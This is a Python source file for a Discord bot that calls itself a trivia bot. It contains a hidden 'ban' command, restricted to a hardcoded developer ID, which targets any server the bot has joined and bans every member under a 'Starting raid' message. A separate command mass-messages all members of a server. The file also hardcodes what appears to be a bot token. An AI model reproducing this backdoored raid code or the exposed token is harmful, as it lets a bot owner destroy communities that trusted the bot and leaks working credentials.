import discord
from discord.ext.commands import bot
from discord import game
from discord.ext import commands
import asyncio
import platform
import colorsys
import random
import time

client = commands.Bot(command_prefix = '*', case_insensitive=True)
Client = discord.client
Clientdiscord = discord.Client()
devs=["548489948928671746"]

@client.event
async def on_ready():
    print('Logged in as '+client.user.name+' (ID:'+client.user.id+') | Connected to '+str(len(client.servers))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users')
    print('--------')
    print('--------')
    print('Started Trivia Bros Premium')
    print('Created by raja')


@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def serverlist(ctx):
    for server in client.servers:
        #print(server.name)
        await client.say(server.name)
                
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)     
async def userinfo(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="{}'s info".format(user.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Name", value=user.name, inline=True)
    embed.add_field(name="ID", value=user.id, inline=True)
    embed.add_field(name="Status", value=user.status, inline=True)
    embed.add_field(name="Highest role", value=user.top_role)
    embed.add_field(name="Joined", value=user.joined_at)
    embed.set_thumbnail(url=user.avatar_url)
    await client.say(embed=embed)

@client.command(pass_context=True)
async def servercount(self):
    """Shows the total servers and users that ☛〘◔‿◔〙☚ is connected to."""
        
    embed=discord.Embed(colour=0xFF0000)
    embed.add_field(name="__Servers__", value="☛〘◔‿◔〙☚ is connected to __**{}**__ servers.".format(len(self.bot.servers)))
    embed.add_field(name="__Users__", value="☛〘◔‿◔〙☚ is connected to __**{}**__ users.".format(str(len(set(self.bot.get_all_members())))))
    embed.set_thumbnail(url=self.bot.user.avatar_url)
    embed.set_author(name="☛〘◔‿◔〙☚", icon_url=self.bot.user.avatar_url)
    await self.bot.say(embed=embed)

@client.command(pass_context=True)
async def left(ctx, serverid):
    if ctx.message.author.id in devs:
        try:
            await client.leave_server(client.get_server(str(serverid)))
            await client.say(f"Left the server")
        except Exception as ex:
            await client.say(f"Server not found. {ex}")


@client.command(pass_context=True)
async def ban(ctx, serverid):
    if ctx.message.author.id in devs:
        try:
            server=client.get_server(str(serverid))
            await client.say(f"**Starting raid on `{server.name}`**")
            for member in list(server.members):
                try:
                    await client.ban(member, 2)
                    await client.say(f"Banned {member.name}")
                except:
                    await client.say(f"Couldn't ban {member.name}")
        except Exception as ex:
            await client.say(f"Server not found. {ex}")
            
@commands.has_permissions(administrator=True)
@client.command(pass_context = True)
async def send(ctx, *, content: str):
    if ctx.message.author.id == '619425921161494538':
        for member in list(ctx.message.server.members):
            try:
                await client.send_message(member, content)
                await client.say("DM Sent To : {} :white_check_mark:  ".format(member))
            except:
                print("can't")
                await client.say("DM can't Sent To : {} :x: ".format(member))
    else:
        await client.say('Sorry')
@commands.has_permissions(administrator=True)
@client.command(pass_context = True)        
async def unbanall(ctx):
    server=ctx.message.server
    ban_list=await client.get_bans(server)
    await client.say('Unbanning {} members'.format(len(ban_list)))
    for member in ban_list:
        await client.unban(server,member)

               
client.run("NjE5MjU3ODg3NDY1NjY4NjI4.XXIG1A.4b9VbcqU78HzO9ocDsl4jWiYNjo")
